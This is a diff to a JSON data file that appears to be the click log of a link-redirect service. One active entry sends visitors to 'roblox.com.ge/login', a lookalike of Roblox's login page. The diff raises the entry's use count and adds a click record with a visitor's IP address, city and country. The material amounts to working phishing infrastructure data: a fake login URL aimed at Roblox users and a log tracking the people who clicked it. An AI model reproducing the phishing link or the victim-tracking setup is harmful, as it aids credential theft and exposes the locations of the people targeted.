@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1335,
+    "useCount": 1336,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10848,6 +10848,14 @@
         "city": "Tala",
         "flag": "🇲🇽",
         "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777410026278,
+        "ip": "188.29.10.66",
+        "country": "United Kingdom",
+        "city": "Worcester Park",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
       }
     ]
   },
